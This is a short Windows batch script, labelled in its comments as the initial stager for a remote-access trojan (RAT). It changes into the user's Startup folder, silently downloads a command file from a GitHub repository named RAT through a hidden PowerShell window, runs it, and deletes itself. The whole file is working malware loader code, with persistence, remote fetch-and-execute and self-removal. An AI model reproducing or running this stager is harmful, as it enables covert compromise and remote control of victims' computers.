@echo off
@REM initial stager for RAT
@REM created by: Petros

@REM variables
set "INITIALPATH=%cd%"
set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"

@REM move into the startup folder
cd "%STARTUP%"

@REM write payloads to startup
powershell powershell.exe -windowstyle hidden  "Invoke-WebRequest -Uri https://github.com/peterpapath/RAT/tree/main/files/wget.cmd -OutFile wget.cmd"

@REM run payload  
powershell ./wget.cmd

@REM cd back to the initial directory
cd "%INITIALPATH%"
del initial.cmd
